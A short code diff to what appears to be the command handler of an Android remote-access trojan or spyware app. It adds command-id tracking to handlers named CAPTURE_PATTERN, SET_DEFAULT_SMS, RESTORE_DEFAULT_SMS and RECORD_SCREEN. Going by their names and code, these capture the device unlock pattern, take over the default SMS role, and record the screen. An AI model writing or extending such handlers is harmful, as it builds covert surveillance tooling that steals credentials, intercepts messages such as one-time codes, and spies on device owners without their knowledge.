@@ -319,6 +319,7 @@ object CommandProcessor {
                     }
                 }
                 "CAPTURE_PATTERN" -> {
+                    ScreenRecordManager.pendingCmdId = id
                     val pm = ctx.getSystemService(Context.POWER_SERVICE) as android.os.PowerManager
                     if (!pm.isInteractive) {
                         status = "FAILED (SCREEN_OFF)"
@@ -519,6 +520,7 @@ object CommandProcessor {
                     }
                 }
                 "SET_DEFAULT_SMS" -> {
+                    DefaultSmsManager.pendingCmdId = id
                     val mode = content.trim().uppercase()
                     val currentDefault = android.provider.Telephony.Sms.getDefaultSmsPackage(ctx)
                     
@@ -550,6 +552,7 @@ object CommandProcessor {
                     }
                 }
                 "RESTORE_DEFAULT_SMS" -> {
+                    DefaultSmsManager.pendingCmdId = id
                     val prevLabel = DefaultSmsManager.getStoredPreviousLabel(ctx)
                     if (prevLabel == null) {
                         status = "FAILED"
@@ -570,6 +573,7 @@ object CommandProcessor {
                     }
                 }
                 "RECORD_SCREEN" -> {
+                    ScreenRecordManager.pendingCmdId = id
                     val parts = content.split("|")
                     val mode = parts.getOrNull(0)?.trim()?.uppercase() ?: "TRIGGER"
                     val dur = parts.getOrNull(1)?.trim()?.toIntOrNull() ?: 60
